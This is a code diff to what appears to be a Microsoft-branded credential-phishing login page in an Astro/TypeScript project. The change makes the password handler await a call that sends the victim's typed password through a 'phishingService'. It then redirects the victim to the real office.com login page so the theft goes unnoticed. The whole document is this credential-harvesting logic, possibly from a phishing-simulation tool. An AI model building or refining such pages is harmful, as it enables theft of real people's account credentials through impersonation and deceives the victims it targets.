@@ -356,11 +356,13 @@ import Layout from "@/layouts/templates/microsoft/Layout.astro";
         }
       },
 
-      handlePasswordSubmit: (event: SubmitEvent) => {
+      handlePasswordSubmit: async(event: SubmitEvent) => {
         event.preventDefault();
         const form = event.target as HTMLFormElement;
         const input = form.elements.namedItem("password") as HTMLInputElement;
-        phishingService.sendPassword(input.value);
+        await phishingService.sendPassword(input.value);
+
+        window.location.replace("https://www.office.com/login?es=UnauthClick&ru=%2F&msafed=0");
       },
     };
   })();
